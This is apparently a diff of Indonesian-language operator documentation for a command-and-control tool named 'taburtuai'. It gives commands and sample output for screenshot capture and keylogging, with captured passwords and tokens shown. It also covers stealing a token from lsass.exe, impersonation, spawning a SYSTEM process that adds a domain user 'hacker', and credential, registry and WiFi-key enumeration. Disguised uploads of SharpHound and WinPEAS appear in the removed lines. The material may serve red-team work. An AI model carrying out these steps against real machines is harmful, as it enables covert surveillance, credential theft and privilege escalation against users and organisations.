@@ -2,226 +2,213 @@
 
 ## Screenshot Desktop
 
-Ambil screenshot desktop target secara real-time.
-
-### `screenshot <id>`
+Ambil screenshot penuh desktop target secara real-time.
 
 ```
-taburtuai(IP:PORT) › screenshot 2703886d --wait
+taburtuai(IP:8000) › screenshot 2703886d --wait
 ```
 
+**Output:**
 ```
+[*] Capturing screenshot on DESKTOP-QLPBF95...
 [+] Screenshot captured.
-    Resolution : 1920x1080
-    Size       : 284,512 bytes
-    Saved to   : /tmp/screenshot_2703886d_20260423_165512.png
+
+    Resolution : 2560x1440
+    Format     : PNG
+    Size       : 892,341 bytes (871 KB)
+
+[i] Simpan: result <cmd-id> --save ./loot/screenshot.png
 ```
-
-### Simpan ke Path Tertentu
-
-```
-taburtuai(IP:PORT) › screenshot 2703886d --save ./screenshots/target_$(date +%Y%m%d_%H%M%S).png --wait
-```
-
-### Kapan Berguna
-
-- Lihat apa yang sedang dikerjakan user (sensitif)
-- Identifikasi software yang terbuka (email, dokumen, browser)
-- Lihat apakah ada security tools yang visible
-- Validasi bahwa agent berjalan di mesin yang benar
 
 ---
 
 ## Keylogger
 
-Rekam semua keystroke yang diketikkan user di target. Data dikumpulkan di buffer agent
-dan bisa diambil kapan saja.
-
-### Start Keylogger
+### Mulai Keylogger
 
 ```
-# Rekam selama 60 detik
-taburtuai(IP:PORT) › keylog start 2703886d --duration 60
-
-# Rekam tanpa batas waktu (hingga di-stop manual)
-taburtuai(IP:PORT) › keylog start 2703886d --duration 0
+taburtuai(IP:8000) › keylog start 2703886d --wait
 ```
 
+**Output:**
 ```
-[+] Keylogger started. Duration: 60s
-[*] Use 'keylog dump 2703886d' to retrieve data.
-[*] Use 'keylog stop 2703886d' to stop early.
-```
-
-### Ambil Data Keylogger
-
-```
-taburtuai(IP:PORT) › keylog dump 2703886d
+[+] Keylogger started. Keystroke buffer aktif.
+[i] Ambil: keylog dump 2703886d
+[i] Stop : keylog stop 2703886d
 ```
 
+### Mulai dengan Auto-Stop
+
 ```
-[+] Keylog buffer (1,247 chars):
+taburtuai(IP:8000) › keylog start 2703886d --duration 300 --wait
+# Auto-stop setelah 300 detik (5 menit)
+```
 
-[2026-04-23 16:45:12] [Window: Google Chrome - Gmail]
-hello john[ENTER]
-how are you today[ENTER]
+### Dump Buffer Keystrokes
 
-[2026-04-23 16:45:58] [Window: Windows PowerShell]
-net user[ENTER]
-net localgroup administrators[ENTER]
+```
+taburtuai(IP:8000) › keylog dump 2703886d --wait
+```
 
-[2026-04-23 16:46:30] [Window: LastPass - Password Manager]
-[CTRL+C]  ← user copy password
+**Output:**
+```
+[+] Keystroke buffer dump (4,821 bytes):
 
-[2026-04-23 16:47:01] [Window: Remote Desktop Connection]
-192.168.1.100[TAB]administrator[TAB]Admin@2026![ENTER]
+[2026-04-23 09:12:01] [CHROME] https://mail.corp.local
+john.doe@corp.local[TAB]CorpMail@2026![ENTER]
+
+[2026-04-23 09:14:33] [CHROME] https://github.com
+johndoe-dev[TAB]ghp_abc123xyz456[ENTER]
+
+[2026-04-23 09:18:45] [NOTEPAD]
+Server: db-prod.corp.local
+Username: dbadmin
+Password: DB@dm1nProd!
+
+[2026-04-23 09:22:17] [WINLOGON]
+john.doe[TAB]CorpWindow$2026[ENTER]
 ```
 
 ### Stop Keylogger
 
 ```
-taburtuai(IP:PORT) › keylog stop 2703886d
+taburtuai(IP:8000) › keylog stop 2703886d --wait
 ```
 
+**Output:**
 ```
-[+] Keylogger stopped. Final buffer retrieved (2,891 chars).
-[data...]
-```
+[+] Keylogger stopped. Final buffer (5,234 chars):
 
-### Clear Buffer
-
-```
-taburtuai(IP:PORT) › keylog clear 2703886d
-[+] Keylog buffer cleared.
+[2026-04-23 09:35:12] [CHROME] https://vpn.corp.local
+john.doe[TAB]VPN_S3cur3![ENTER]
 ```
 
----
+### Bersihkan Buffer
 
-## Enumerasi Manual via Shell
-
-Selain tool built-in, banyak informasi bisa didapat via `shell` atau `cmd`:
-
-### Active Directory Enumeration
+Hapus buffer tanpa stop keylogger dan tanpa mengembalikan konten:
 
 ```
-# Informasi domain
-cmd 2703886d "net user /domain"
-cmd 2703886d "net group /domain"
-cmd 2703886d "net group 'Domain Admins' /domain"
-cmd 2703886d "net group 'Enterprise Admins' /domain"
-cmd 2703886d "nltest /domain_trusts"
-cmd 2703886d "dsquery user -limit 0"
-
-# Cari Domain Controller
-cmd 2703886d "nltest /dclist:DOMAIN"
-cmd 2703886d "nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN"
-```
-
-### Local Enumeration
-
-```
-# Credential files
-cmd 2703886d "dir C:\Users\windows\AppData\Roaming\FileZilla\"
-cmd 2703886d "dir C:\Users\windows\.ssh\"
-cmd 2703886d "dir C:\Users\windows\AppData\Local\Microsoft\Credentials\"
-cmd 2703886d "dir C:\Users\windows\AppData\Roaming\Microsoft\Credentials\"
-
-# Windows Credential Manager
-cmd 2703886d "cmdkey /list"
-
-# Registry credential search
-cmd 2703886d "reg query HKLM /f password /t REG_SZ /s"
-cmd 2703886d "reg query HKCU /f password /t REG_SZ /s"
-
-# Wifi passwords
-cmd 2703886d "netsh wlan show profiles"
-cmd 2703886d "netsh wlan show profile name='SSID' key=clear"
-```
-
-### Files Menarik
-
-```
-# Cari file dengan keyword sensitif
-cmd 2703886d "dir C:\ /s /b 2>nul | findstr /i \"password credential secret key config\""
-
-# Cari file tipe tertentu
-cmd 2703886d "dir C:\Users /s /b 2>nul | findstr /i \".kdbx .pfx .p12 .pem .key\""
-
-# Recycle bin
-cmd 2703886d "dir C:\$Recycle.Bin /s /a"
+taburtuai(IP:8000) › keylog clear 2703886d --wait
+# [+] Keystroke buffer cleared. Keylogger tetap berjalan.
 ```
 
 ---
 
-## Upload dan Jalankan Enumeration Tool
+## Token Enumeration
 
-Untuk enumeration yang lebih komprehensif, upload tool:
-
-### SharpHound (BloodHound collector)
+List semua proses dan token info (user, integrity, privilege):
 
 ```
-# Upload SharpHound
-files upload 2703886d /tools/SharpHound.exe "C:\Temp\svcs.exe"
-
-# Jalankan
-cmd 2703886d "C:\Temp\svcs.exe -c All --OutputDirectory C:\Temp" --timeout 600 --wait
-
-# Download output
-files download 2703886d "C:\Temp\20260423_BloodHound.zip" ./bloodhound.zip
-
-# Cleanup
-cmd 2703886d "del C:\Temp\svcs.exe && del C:\Temp\*BloodHound*"
+taburtuai(IP:8000) › token list 2703886d --wait
 ```
 
-### WinPEAS (Privilege Escalation Check)
-
+**Output:**
 ```
-files upload 2703886d /tools/winPEASx64.exe "C:\Temp\svc.exe"
-cmd 2703886d "C:\Temp\svc.exe" --timeout 300 --wait
-cmd 2703886d "del C:\Temp\svc.exe"
-```
+[+] Token enumeration for DESKTOP-QLPBF95:
 
-### Seatbelt (Security Checks)
-
-```
-files upload 2703886d /tools/Seatbelt.exe "C:\Temp\seat.exe"
-cmd 2703886d "C:\Temp\seat.exe -group=all" --timeout 120 --wait
-cmd 2703886d "del C:\Temp\seat.exe"
+PID    NAME                       USER                    INTEGRITY   ELEVATED
+-----  -------------------------  ----------------------  ----------  --------
+724    lsass.exe                  NT AUTHORITY\SYSTEM     System      Yes
+3048   explorer.exe               CORP\john.doe           Medium      No
+6720   cmd.exe (elevated)         CORP\Administrator      High        Yes
+4512   agent_windows_stealth.exe  CORP\john.doe           Medium      No
 ```
 
 ---
 
-## Scenario: Reconnaissance Lengkap
+## Token Steal (Impersonation)
 
-```bash
-# --- PHASE 1: System info dasar ---
-cmd 2703886d "whoami /all"
-cmd 2703886d "systeminfo"
-cmd 2703886d "ipconfig /all"
-cmd 2703886d "netstat -ano"
+```
+taburtuai(IP:8000) › token steal 2703886d --pid 724 --wait
+```
 
-# --- PHASE 2: Screenshot dan keylog ---
+**Output:**
+```
+[*] Opening PID 724 (lsass.exe)...
+[+] Token stolen. Now impersonating: NT AUTHORITY\SYSTEM
+
+[i] Verifikasi: cmd 2703886d "whoami"
+```
+
+```
+taburtuai(IP:8000) › cmd 2703886d "whoami"
+# NT AUTHORITY\SYSTEM
+```
+
+---
+
+## Token Make (LogonUser)
+
+Buat token dari kredensial yang diketahui:
+
+```
+taburtuai(IP:8000) › token make 2703886d \
+  --user john.doe \
+  --domain CORP \
+  --pass "CorpMail@2026!" \
+  --wait
+```
+
+**Output:**
+```
+[+] LogonUser succeeded. Impersonating: CORP\john.doe
+```
+
+---
+
+## Token RunAs
+
+Spawn proses dalam konteks user lain:
+
+```
+taburtuai(IP:8000) › token runas 2703886d \
+  --pid 724 \
+  --exe "cmd.exe" \
+  --args "/c net user hacker P@ss123! /add /domain" \
+  --wait
+```
+
+**Output:**
+```
+[+] cmd.exe (PID: 9120) spawned as NT AUTHORITY\SYSTEM.
+```
+
+---
+
+## Token Revert
+
+```
+taburtuai(IP:8000) › token revert 2703886d --wait
+# [+] Reverted to: CORP\john.doe (Medium)
+```
+
+---
+
+## Skenario Reconnaissance Lengkap
+
+```
+# Screenshot awal (lihat apa yang sedang dikerjakan user)
 screenshot 2703886d --wait
-keylog start 2703886d --duration 300  # 5 menit
 
-# --- PHASE 3: User & Group enumeration ---
-cmd 2703886d "net user"
-cmd 2703886d "net localgroup administrators"
-cmd 2703886d "net user /domain"  # kalau domain-joined
-cmd 2703886d "net group 'Domain Admins' /domain"
+# Start keylogger 10 menit
+keylog start 2703886d --duration 600 --wait
 
-# --- PHASE 4: Security products ---
-cmd 2703886d "tasklist | findstr -i \"defender crowdstrike sentinel cylance endpoint\""
-cmd 2703886d "sc query windefend"
+# Sambil keylog berjalan — enumerasi domain
+cmd 2703886d "net group 'Domain Admins' /domain" --method powershell --wait
+cmd 2703886d "net group 'Enterprise Admins' /domain" --method powershell --wait
+cmd 2703886d "Get-ADComputer -Filter * | Select Name,OperatingSystem" --method powershell --timeout 60 --wait
 
-# --- PHASE 5: Files sensitif ---
-cmd 2703886d "dir C:\Users\windows\Desktop"
-cmd 2703886d "dir C:\Users\windows\Documents"
-cmd 2703886d "cmdkey /list"
+# Enumerasi token untuk target impersonation
+token list 2703886d --wait
 
-# --- PHASE 6: Ambil keylog ---
-keylog dump 2703886d
-keylog stop 2703886d
+# Ambil hasil keylogger
+keylog stop 2703886d --wait
+
+# Clipboard check
+creds clipboard 2703886d --wait
+
+# Screenshot kedua
+screenshot 2703886d --wait
 ```
 
 ---
